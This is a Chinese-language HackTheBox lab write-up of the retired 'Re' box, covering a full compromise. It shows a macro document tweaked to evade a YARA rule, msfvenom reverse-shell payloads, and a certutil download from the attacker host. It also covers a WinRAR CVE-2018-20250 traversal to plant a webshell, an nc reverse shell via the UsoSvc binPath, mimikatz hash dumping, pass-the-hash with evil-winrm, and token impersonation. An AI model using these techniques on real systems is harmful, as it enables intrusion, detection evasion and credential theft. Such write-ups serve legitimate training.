
# HTB-Re 渗透全记录


                                阅读量   
                                **796258**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/197816/t01d1640f18bd277deb.jpg)](./img/197816/t01d1640f18bd277deb.jpg)



## 前言

春节闭门不出，在家刷HTB练习渗透，目前Re这个box已经retired，因此把总结的详细渗透过程发出来。这个box用到了OpenOffice宏后门，Winrar目录穿越和UsoSvc服务提权。最后拿到system权限读flag还折腾了不少，整个过程都值得学习一下。

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014de045ea3a780706.png)



## Port

```
root@kali:~/pentest/re# masscan -e tun0 -p1-65535 10.10.10.144 --rate=1000

Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2020-01-26 08:03:07 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 445/tcp on 10.10.10.144
Discovered open port 80/tcp on 10.10.10.144
```

```
root@kali:~/pentest/re# nmap -sC -sV -oA Re -p80,445 10.10.10.144
Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-26 08:06 GMT
Nmap scan report for 10.10.10.144
Host is up (0.25s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Visit reblog.htb
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h01m10s, deviation: 0s, median: 1h01m10s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-01-13 09:09:21
|_  start_date: N/A
```

扫描只发现了一个http服务和smb共享文件服务



## Blog

根据nmap扫描的提示，直接把域名ip写入hosts

```
echo -e "10.10.10.144treblog.htb" &gt;&gt; /etc/hosts
```

访问web，发现是一个blog，有几篇博文需要注意一下。

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01be49904fb8e253fa.png)

简要内容就是作者开放了一个ods文件宏后门检测的服务，使用yara进行过滤。



## smb

直接尝试匿名访问smb，发现存在一个叫`malware_dropbox`的共享文件夹。

```
root@kali:~# smbmap -H 10.10.10.144 -u 'anonymous' -p ''
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.144...
[+] IP: 10.10.10.144:445        Name: 10.10.10.144
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        .
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-334-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-1c0-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-3e4-0
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-3a8-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    spoolss
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-680-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    trkwks
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT
        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-24c-0
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2CatalogChangeListener-258-0
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOTCIMV2SCM EVENT PROVIDER
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132234368815825955.1856.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132234368815872644.1884.DefaultAppDomain.powershell
        fr--r--r--                3 Sun Dec 31 19:03:58 1600    efsrpc
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PSHost.132234370425623129.3428.DefaultAppDomain.powershell
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iisipma879ea91-3bc1-4fb6-89d7-9d62fc5e507f
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    iislogpipec892292b-ab19-499e-bbef-39bdba027ff4
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    S1zLwjQTPA0xOsRWCq9N6MQFkt9b9GCIUZvroK94XUHcG4BhfCfDionXk4R8bvw9fccVl0BHbUaIG4hGK4g9rLbSmGvzCKClSU7FNe66HfCMo4aqTxNFEy
        fr--r--r--                1 Sun Dec 31 19:03:58 1600    CPFATP_3652_v4.0.30319
        IPC$                                                    READ ONLY       Remote IPC
        .
        dr--r--r--                0 Mon Jan 13 20:51:16 2020    .
        dr--r--r--                0 Mon Jan 13 20:51:16 2020    ..
        malware_dropbox                                         READ ONLY
```

此目录虽然扫描发现只有`READ ONLY`，而实际上是可以上传文件的。随便上传一个文件，发现过1分钟左右就会消失，相信就是上面blog提到的ods文件检测服务入口了。

```
root@kali:~/pentest/re# smbclient \\10.10.10.144\malware_dropbox
WARNING: The "syslog" option is deprecated
WARNING: The "syslog" option is deprecated
Enter WORKGROUProot's password:
Try "help" to get a list of possible commands.
smb: &gt; ls
  .                                   D        0  Tue Jun 18 22:08:36 2019
  ..                                  D        0  Tue Jun 18 22:08:36 2019

                8247551 blocks of size 4096. 4295441 blocks available
smb: &gt; put Re.xml
putting file Re.xml as Re.xml (3.2 kb/s) (average 2.4 kb/s)
smb: &gt; ls
  .                                   D        0  Mon Jan 13 09:26:31 2020
  ..                                  D        0  Mon Jan 13 09:26:31 2020
  Re.xml                              A     2410  Mon Jan 13 09:26:31 2020
ls
                8247551 blocks of size 4096. 4295440 blocks available
smb: &gt; ls
  .                                   D        0  Mon Jan 13 09:26:35 2020
  ..                                  D        0  Mon Jan 13 09:26:35 2020

                8247551 blocks of size 4096. 4295441 blocks available
smb: &gt;
```



## ODS

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0147773a62e8b7c975.png)

这篇博文里面提及一篇文章：[https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html](https://0xdf.gitlab.io/2019/03/27/analyzing-document-macros-with-yara.html) ，里面有生成ods文件的示例，以及提到一个yara过滤规则：

```
rule metasploit
{
        strings:
                        $getos = "select case getGUIType" nocase wide ascii
                        $getext = "select case GetOS" nocase wide ascii
                        $func1 = "Sub OnLoad" nocase wide ascii
                        $func2 = "Sub Exploit" nocase wide ascii
                        $func3 = "Function GetOS() as string" nocase wide ascii
                        $func4 = "Function GetExtName() as string" nocase wide ascii

                condition:
                    (all of ($get*) or 2 of ($func*))
}
```

这个规则的意思是：匹配到全部$get开头的规则 或者 任意两个$func开头的规则，就无法通过。

```
use exploit/multi/misc/openoffice_document_macro
set srvhost 10.10.14.220
set srvport 23333
run
[+] msf.odt stored at /root/.msf4/local/msf.odt
```

按照文章的介绍，可以直接使用metasploit生成一个恶意odt文件，而上面的yara规则明显是针对metasploit的，因此需要修改一下宏脚本进行绕过。

odt文件本质为一个zip压缩包，将生成的msf.odt解压。

修改 `/Basic/Standard/Module1.xml`中的宏脚本，删除多余的`Sub Exploit`，`GetOS()`和`GetExtName()`

同时，由于不清楚有没有其他过滤规则，因此选择了使用certutil来下载shell.exe，尽量不使用`powershell`反弹脚本。

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018fd59668bb5d48ae.png)

重新打包，重命名为msf.ods

然后用msfvenom生成一个后门程序shell.exe放在本地。

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.220 LPORT=4444 -f exe -i 3 -o shell.exe
```

开启http服务

```
python3 -m http.server 23333
```

msfconsole配置handler进行监听

```
msf5 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
```

然后用smbclient把生成的msf.ods恶意文件上传到smb

```
root@kali:~/pentest/Re# smbclient \\10.10.10.144\malware_dropbox
Enter WORKGROUProot's password:
Try "help" to get a list of possible commands.
smb: &gt; put msf.ods

```

然后稍等片刻，http服务会提示靶机访问shell.exe，然后shell就会弹回来，到此获取到一个flag。

```
C:UserslukeDesktop&gt;type user.txt
type user.txt
FE4173xxxxxxxxxxxxx0D9F384D3
```



## Winrar 目录穿越

查看当前用户的Documents目录，可以看到自动处理ods文件的脚本和过滤规则

```
Directory of C:UserslukeDocuments

06/18/2019  01:05 PM    &lt;DIR&gt;          .
06/18/2019  01:05 PM    &lt;DIR&gt;          ..
01/13/2020  09:16 PM    &lt;DIR&gt;          malware_dropbox
01/13/2020  09:16 PM    &lt;DIR&gt;          malware_process
01/13/2020  09:16 PM    &lt;DIR&gt;          ods
06/18/2019  09:30 PM             1,096 ods.yara
06/18/2019  09:33 PM             1,783 process_samples.ps1
03/13/2019  05:47 PM         1,485,312 yara64.exe
               3 File(s)      1,488,191 bytes
               5 Dir(s)  17,590,632,448 bytes free
```

ods.yara

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0185abb752995f5333.png)

基本上把大部分powershell关键字都过滤，上面用来下载执行后门的方式还是比较稳的。

process_samples.ps1

```
$process_dir = "C:UserslukeDocumentsmalware_process"
$files_to_analyze = "C:UserslukeDocumentsods"
$yara = "C:UserslukeDocumentsyara64.exe"
$rule = "C:UserslukeDocumentsods.yara"

while($true) {
    # Get new samples
    move C:UserslukeDocumentsmalware_dropbox* $process_dir

    # copy each ods to zip file
    Get-ChildItem $process_dir -Filter *.ods | 
    Copy-Item -Destination {$_.fullname -replace ".ods", ".zip"}

    Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {

        # unzip archive to get access to content
        $unzipdir = Join-Path $_.directory $_.Basename
        New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
        Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir

        # yara to look for known malware
        $yara_out = &amp; $yara -r $rule $unzipdir
        $ods_name = $_.fullname -replace ".zip", ".ods"
        if ($yara_out.length -gt 0) {
            Remove-Item $ods_name
        }
    }


    # if any ods files left, make sure they launch, and then archive:
    $files = ls $process_dir*.ods
    if ( $files.length -gt 0) { 
        # launch ods files
        Invoke-Item "C:UserslukeDocumentsmalware_process*.ods"
        Start-Sleep -s 5

        # kill open office, sleep
        Stop-Process -Name soffice*
        Start-Sleep -s 5

        #&amp; 'C:Program Files (x86)WinRARRar.exe' a -ep $process_dirtemp.rar $process_dir*.ods 2&gt;&amp;1 | Out-Null
        Compress-Archive -Path "$process_dir*.ods" -DestinationPath "$process_dirtemp.zip"
        $hash = (Get-FileHash -Algorithm MD5 $process_dirtemp.zip).hash
        # Upstream processing may expect rars. Rename to .rar
        Move-Item -Force -Path $process_dirtemp.zip -Destination $files_to_analyze$hash.rar    
    }

    Remove-Item -Recurse -force -Path $process_dir*
    Start-Sleep -s 5
}
```

留意到脚本最后的部分，脚本会把通过检测的ods进行打包，文件名为md5的hash值，压缩格式为rar，看到rar很容易联想到去年爆出的目录穿越漏洞（CVE-2018-20250），具体可以查看以下这篇文章：

[https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/](https://research.checkpoint.com/2019/extracting-code-execution-from-winrar/)

然后查看Program Files目录，靶机没有安装WinRAR，不过发现有PeaZip，这个软件比较陌生，查了一下存在一个命令注入漏洞：[https://www.rapid7.com/db/modules/exploit/multi/fileformat/peazip_command_injection](https://www.rapid7.com/db/modules/exploit/multi/fileformat/peazip_command_injection)

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019254e678b0127428.png)

但是靶机安装的版本不在影响范围：

```
VersionInfo       : File:             C:Program FilesPeaZippeazip.exe
                    InternalName:     PeaZip
                    OriginalFilename: PeaZip
                    FileVersion:      6.7.0
                    FileDescription:  PeaZip, file and archive manager
                    Product:          PeaZip
                    ProductVersion:   6.7.0
                    Debug:            False
                    Patched:          False
                    PreRelease:       False
                    PrivateBuild:     False
                    SpecialBuild:     False
                    Language:         English (United States)
```

继续检查peazip的目录，发现这个软件同样有`UNACEV2.DLL`，那么理论上Winrar目录穿越的漏洞在这个软件上同样可行。

```
Directory: C:Program FilesPeaZipresunace


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         9/1/2007   2:56 PM            601 note_install.txt
-a----        1/15/2010  12:29 PM           1304 peazip-unace-WIN64.iss
-a----        1/15/2010  12:27 PM           1269 peazip-unace-WINDOWS.iss
-a----         6/2/2007   9:41 AM          27136 unace.exe
-a----        8/26/2005   2:50 AM          77312 UNACEV2.DLL
-a----        3/20/2019   2:12 PM           1565 unins000.dat
-a----        3/20/2019   2:11 PM         707354 unins000.exe

```

使用 [https://github.com/WyAtu/CVE-2018-20250](https://github.com/WyAtu/CVE-2018-20250) 的脚本生成rar文件。

需要修改代码如下：

```
# The archive filename you want
rar_filename = "test.rar"
# The evil file you want to run
evil_filename = "shell.exe"
# The decompression path you want, such shown below
target_filename = r"C:C:C:../../../../../../../tmp/kira.exe"
```

将生成文件放入`C:UserslukeDocumentsods`，注意需要修改文件名为`md5.rar`

```
certutil.exe -urlcache -split -f http://10.10.14.220:23333/test.rar C:UserslukeDocumentsodsee6ea50adb1d71c85d28d2c56c13e166.rar
```

然后查看tmp可发现成功写入

```
Directory: C:tmp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/1/2020   6:54 PM           2109 kira.exe

```

然后需要思考的是，需要把什么文件写入什么目录，一般的利用思路是将后门程序写入用户的启动项，但是HTB的靶机并不会重启，只会重置，因此这个套路是行不通的。

查看一下写入文件的权限，发现owner是另外一个用户cam，那么猜测执行解压的脚本用户是cam。

```
get-acl kira.exe|format-list

Path   : Microsoft.PowerShell.CoreFileSystem::C:tmpkira.exe
Owner  : REcam
Group  : RENone
Access : NT AUTHORITYSYSTEM Allow  FullControl
         BUILTINAdministrators Allow  FullControl
         BUILTINUsers Allow  ReadAndExecute, Synchronize
         REcam Allow  FullControl
Audit  :
Sddl   : O:S-1-5-21-311800348-2366743891-1978325779-1002G:S-1-5-21-311800348-2366743891-1978325779-513D:AI(A;ID;FA;;;SY
         )(A;ID;FA;;;BA)(A;ID;0x1200a9;;;BU)(A;ID;FA;;;S-1-5-21-311800348-2366743891-1978325779-1002)
```

回想起有web服务，找一下web的路径看看，发现当前用户是没权限访问，那么cam有可能可以吗？

```
Directory: C:inetpubwwwroot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2020   6:54 PM                blog
d-----        3/27/2019   2:10 PM                ip
d-----        6/18/2019  10:18 PM                re

C:inetpubwwwrootblog
Access is denied.

```

网上找一个aspx大马，修改一下生成rar的exp

```
# The archive filename you want
rar_filename = "test.rar"
# The evil file you want to runkira
evil_filename = "kira.aspx"
# The decompression path you want, such shown below
target_filename = r"C:C:C:../../../../../../../inetpub/wwwroot/blog/kira.aspx"
```

成功获取到一个webshell！

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a3fe3e6564cee851.png)

分别把webshell写到`ip`和`re`目录，发现有跟`blog`不同的用户权限，其中`iis apppoolre`可以打开根目录`proj_drop`

```
PS C:&gt; get-acl proj_drop|format-list

Path   : Microsoft.PowerShell.CoreFileSystem::C:proj_drop
Owner  : BUILTINAdministrators
Group  : RENone
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITYSYSTEM Allow  FullControl
         BUILTINAdministrators Allow  FullControl
         REcoby Allow  Modify, Synchronize
         REcam Allow  FullControl
         IIS APPPOOLre Allow  ReadAndExecute, Synchronize
         IIS APPPOOLre Allow  Write, Synchronize
```

`proj_drop`这个目录比较可疑，放文件进去同样会消失，有可能延续之前的套路，在里面放入合适的文件，触发特定的漏洞，重新查看题目的博客，看看是否有提示。

[![](./img/197816/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0111496b8107c46f4a.png)

简单看了一下，作者自己都未能成功利用漏洞，而且环境中并没有发现开放18001端口，（作者有疑似利用题目收exp的嫌疑[震惊]），需要寻找其他思路。

```
Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       816
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       448
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       312
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1656
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       584
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       596
```



## UsoSvc提权

思路断了，这时候需要执行一些辅助脚本进行检测。这里我使用了`PowerUp.ps1` [https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

```
powershell -ep bypass
Import-Module .PowerUp.ps1
Invoke-AllChecks
```

脚本回显提示有服务的权限异常

```
[*] Checking service permissions...

ServiceName   : UsoSvc
Path          : C:Windowssystem32svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
```

通过修改UsoSvc服务的binPath，然后重新启动服务即可执行我们的命令

```
PS C:&gt; sc.exe stop UsoSvc
PS C:&gt; sc.exe config usosvc binPath="C:WindowsSystem32spooldriverscolornc.exe 10.10.14.220 23336 -e cmd.exe"
PS C:&gt; sc.exe qc usosvc
PS C:&gt; sc.exe start UsoSvc
```

反弹shell直接拿到system权限，但是最后一步查看`root.txt`竟然无法打开，查看权限

```
PS C:tmp&gt; get-acl C:UsersAdministratorDesktoproot.txt|format-list

Path   : Microsoft.PowerShell.CoreFileSystem::C:UsersAdministratorDesktoproot.txt
Owner  : REcoby
Group  : RENone
Access : NT AUTHORITYSYSTEM Allow  FullControl
         BUILTINAdministrators Allow  FullControl
         REAdministrator Allow  FullControl
         REcoby Allow  FullControl
```

但是打不开，明明是有权限的

```
C:Windowssystem32&gt;type C:UsersAdministratorDesktoproot.txt
Access is denied.
```

用以下命令修改权限后仍然打不开

```
cacls C:UsersAdministratorDesktoproot.txt /e /p system:f
```



## mimikatz dump（easy way）

留意到Administrator和coby都可以打开root.txt，何不尝试一下切换到其他用户。上传mimikatz，导出所有用户hash

```
privilege::debug
token::elevate
lsadump::sam
```

由于我们是system权限，轻松获取到其他用户的NTLM hash。

```
User : Administrator
  Hash NTLM: caf97bbc4c410103485a3cf950496493

User : coby
  Hash NTLM: fa88e03e41fdf7b707979c50d57c06cf
```

之前查看端口发现，靶机是有开放5985端口，不过有防火墙，所以端口扫描时并没有发现，而winrm是可以通过hash进行登录的。

然后用ew转发winrm的端口到本地

```
攻击端主机：
./ew_for_linux64 -s lcx_listen -l 5985 -e 23335
靶机：
ew.exe -s lcx_slave -d 10.10.14.220 -e 23335 -f 127.0.0.1 -g 5985
```

使用coby的hash可以登录并读到root.txt

```
root@kali:~/pentest/Re# evil-winrm -i 127.0.0.1 -u coby -H fa88e03e41fdf7b707979c50d57c06cf

Evil-WinRM shell v2.1
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:UserscobyDocuments&gt; type C:UsersAdministratorDesktoproot.txt
1B4FB9xxxxxxxxxxxxxxxxxxxx8F7715D
```



## incognito（very easy way）

为何有权限却读不到flag呢？事后请教了一位外国友人，原来是因为文件被加密（EFS）了，因此即使有权限也是打不开的。使用cipher命令检查root.txt，看到文件被加密了，只有`Administrator`和`coby`可以解密。

```
PS C:UsersAdministratorDesktop&gt; cipher /c root.txt

 Listing C:UsersAdministratorDesktop
 New files added to this directory will not be encrypted.

E root.txt
  Compatibility Level:
    Windows XP/Server 2003

  Users who can decrypt:
    REAdministrator [Administrator(Administrator@RE)]
    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D

    coby(coby@RE)
    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0

  No recovery certificate found.

  Key information cannot be retrieved.

The specified file could not be decrypted.
```

这次使用msf进行，按照之前的步骤获取system之后马上执行之前放进去的后门反弹shell。

`meterpreter`里面`incognito`模块可以进行用户切换，这个方法比用mimikatz还要再简单一点。

```
meterpreter &gt; load incognito  # 用来盗窃目标主机的令牌或是假冒用户
Loading extension incognito...Success.
meterpreter &gt; list_tokens -u  # 列出目标主机用户的可用令牌

Delegation Tokens Available
========================================
Font Driver HostUMFD-0
Font Driver HostUMFD-1
IIS APPPOOLip
IIS APPPOOLre
IIS APPPOOLREblog
NT AUTHORITYIUSR
NT AUTHORITYLOCAL SERVICE
NT AUTHORITYNETWORK SERVICE
NT AUTHORITYSYSTEM
REcam
REcoby
REluke
Window ManagerDWM-1

Impersonation Tokens Available
========================================
No tokens available
meterpreter &gt; impersonate_token "RE\coby"
[+] Delegation token available
[+] Successfully impersonated user REcoby
meterpreter &gt; cat c:\users\administrator\desktop\root.txt
1B4FB9xxxxxxxxxxxxxxxxxxx8F7715D
```

至此渗透完毕

```
C:tmp&gt;whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
recoby   S-1-5-21-311800348-2366743891-1978325779-1000
```



## 总结

这个box的渗透过程还是比较艰辛，获取到的每个用户权限都不是很大，需要理解自动脚本的运行过程和猜测脚本运行效果，即使知道漏洞利用方式还要进一步思考如何利用，即便是到最后拿system权限后，还需一顿操作才最终拿到flag。
